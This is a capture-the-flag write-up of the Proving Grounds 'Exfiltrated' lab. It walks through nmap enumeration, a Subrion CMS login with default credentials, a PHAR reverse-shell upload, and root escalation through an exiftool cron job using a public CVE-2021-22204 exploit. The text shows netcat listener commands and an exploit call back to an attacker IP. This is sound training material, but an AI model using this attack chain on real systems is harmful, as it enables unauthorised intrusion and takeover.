---
title: "Proving Grounds - Exfiltrated"
categories: [CTF, Proving Grounds - Play]
tags: [EASY, Linux, Web, Subrion, Exiftool]
mermaid: true
image: ../assets/img/provingrounds/offsec.jpeg
---

Exfiltrated was a well-structured box that provided an excellent opportunity to exploit a Subrion CMS vulnerability and perform privilege escalation via an Exiftool exploit. 

Initial enumeration led to the discovery of Subrion CMS, and default credentials allowed for access to the admin panel. 

By exploiting a file upload vulnerability, a reverse shell was obtained. Further enumeration revealed a cron job running Exiftool on uploaded images, which was leveraged to escalate privileges and capture the flag.

# Diagram

```mermaid
graph TD
    A[Host Enumeration] -->|Nmap Scan| B[Identify Subrion CMS]
    B -->|Default Credentials| C[Admin Panel Access]
    C -->|File Upload Vulnerability| D[Upload Reverse Shell]
    D -->|Execute Reverse Shell| E[Gain Initial Access]
    E -->|Cron Job Enumeration| F[Identify Exiftool Usage]
    F -->|Exploit Exiftool| G[Privilege Escalation]
    G -->|Capture Flag| H[Success]
```

## Information Gathering

### Portscan

---

- `nmap -sS -Pn -n -T4 --open 192.168.177.163`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled.png)
    
- `nmap -sS -Pn -n -T4 --open 192.168.177.163 -p-`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%201.png)
    
- `nmap -sVC -Pn -n -p 22,80 192.168.177.163`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%202.png)
    

## Enumeration

### HTTP 80
---

- [http://192.168.177.163](http://192.168.177.163) → redirects to exfiltrated.offsec
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%203.png)
    
- `cat /etc/hosts`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%204.png)
    

- [http://exfiltrated.offsec/](http://exfiltrated.offsec/) → Subrion CMS
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%205.png)
    
- [http://exfiltrated.offsec/robots.txt](http://exfiltrated.offsec/robots.txt)
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%206.png)
    
- [http://exfiltrated.offsec/panel/](http://exfiltrated.offsec/panel/) → Panel Login. CMS v4.2.1
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%207.png)
    

- `searchsploit Subrion CMS 4.2.1`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%208.png)
    

- Subrion default credentials: admin/admin
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%209.png)
    

- [http://exfiltrated.offsec/panel/members/add/](http://exfiltrated.offsec/panel/members/add/) → made login
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2010.png)
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2011.png)
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2012.png)
    

Once authenticated i tried this exploit

- https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE

After read the exploit i decided to put an reverse shell inside the [http://exfiltrated.offsec/panel/uploads/](http://exfiltrated.offsec/panel/uploads/) 

- `cat revShell.phar`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2013.png)
    
- [http://exfiltrated.offsec/panel/uploads/](http://exfiltrated.offsec/panel/uploads/)
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2014.png)
    

- [http://exfiltrated.offsec/uploads/revShell.phar](http://exfiltrated.offsec/uploads/revShell.phar)
`rlwrap nc -lvnp 80`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2015.png)
    

## Priv Escalation

---

- `cat /etc/cron*`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2016.png)
    
- `cat /opt/image-exif.sh`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2017.png)
    
- `ls -lh /opt/image-exif.sh`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2018.png)
    
- `ls -ld /var/www/html/subrion/uploads /opt/metadata`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2019.png)
    

Since the cron script writes EXIF metadata to a log file in `/opt/metadata` using the `exiftool` command, one possible attack vector is to exploit a symlink attack if the script does not properly handle symbolic links.

- `exiftool -ver`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2020.png)
    

- `searchsploit exiftool`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2021.png)
    

Searching more i found this repository

[https://github.com/mr-tuhin/CVE-2021-22204-exiftool.git](https://github.com/mr-tuhin/CVE-2021-22204-exiftool.git)

But wasn’t working because of the bbz

- `sudo apt-get install imagemagick djvulibre-bin exiftool`

- `python3 exploit.py 192.168.45.194 4430`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2022.png)
    
- [http://exfiltrated.offsec/panel/uploads/#elf_l1_Lw](http://exfiltrated.offsec/panel/uploads/#elf_l1_Lw)
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2023.png)
    
- [http://exfiltrated.offsec/uploads/image.jpg](http://exfiltrated.offsec/uploads/image.jpg)
`rlwrap nc -lvnp 4430`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2024.png)
    

- `Flag.txt`
    
    ![Untitled](../assets/img/provingrounds/Exfiltrated/Untitled%2025.png)